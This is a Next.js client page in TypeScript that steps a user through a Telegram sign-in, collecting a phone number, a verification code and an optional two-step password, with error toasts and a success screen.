"use client"

import { useState } from "react"
import { AuthLayout } from "@/components/auth-layout"
import { PhoneForm } from "@/components/phone-form"
import { VerificationForm } from "@/components/verification-form"
import { TwoStepForm } from "@/components/two-step-form"
import { SuccessScreen } from "@/components/success-screen"
import { useToast } from "@/hooks/use-toast"
import { sendCode, verifyCode, verify2FA, getUserInfo } from "@/lib/telegram"

type Step = "phone" | "verification" | "two-step" | "success"

export default function Home() {
  const [step, setStep] = useState<Step>("phone")
  const [username, setUsername] = useState("")
  const [loading, setLoading] = useState(false)
  const [phoneNumber, setPhoneNumber] = useState("")
  const [phoneCodeHash, setPhoneCodeHash] = useState("")

  const { toast } = useToast()

  const handlePhoneSubmit = async (phone: string) => {
    setLoading(true)
    setPhoneNumber(phone)
    try {
      const result = await sendCode(phone)
      setPhoneCodeHash(result.phoneCodeHash || "")
      if (result.success) {
        setStep("verification")
      } else {
        toast({
          title: "Error",
          description: result.message,
          variant: "destructive",
        })
      }
    } catch (error) {
      toast({
        title: "Error",
        description: "Failed to send verification code",
        variant: "destructive",
      })
    } finally {
      setLoading(false)
    }
  }

  const handleVerificationSubmit = async (code: string) => {
    setLoading(true)
    try {
      const result = await verifyCode(phoneNumber, code, phoneCodeHash)
      if (result.success) {
        if (result.requires2FA) {
          setStep("two-step")
        } else {
          const userInfo = await getUserInfo()
          if (userInfo.success) {
            setUsername(userInfo.username || "")
            setStep("success")
          }
        }
      } else {
        toast({
          title: "Error",
          description: result.message,
          variant: "destructive",
        })
      }
    } catch (error) {
      toast({
        title: "Error",
        description: "Failed to verify code",
        variant: "destructive",
      })
    } finally {
      setLoading(false)
    }
  }

  const handleTwoStepSubmit = async (password: string) => {
    setLoading(true)
    try {
      const result = await verify2FA(password)
      if (result.success) {
        const userInfo = await getUserInfo()
        if (userInfo.success) {
          setUsername(userInfo.username || "")
          setStep("success")
        }
      } else {
        toast({
          title: "Error",
          description: result.message,
          variant: "destructive",
        })
      }
    } catch (error) {
      toast({
        title: "Error",
        description: "Failed to verify password",
        variant: "destructive",
      })
    } finally {
      setLoading(false)
    }
  }

  return (
      <AuthLayout>
        {step === "phone" && <PhoneForm onSubmit={handlePhoneSubmit} loading={loading} />}
        {step === "verification" && (
          <VerificationForm onSubmit={handleVerificationSubmit} onBack={() => setStep("phone")} />
        )}
        {step === "two-step" && <TwoStepForm onSubmit={handleTwoStepSubmit} />}
        {step === "success" && <SuccessScreen username={username} />}
      </AuthLayout>
  )
}



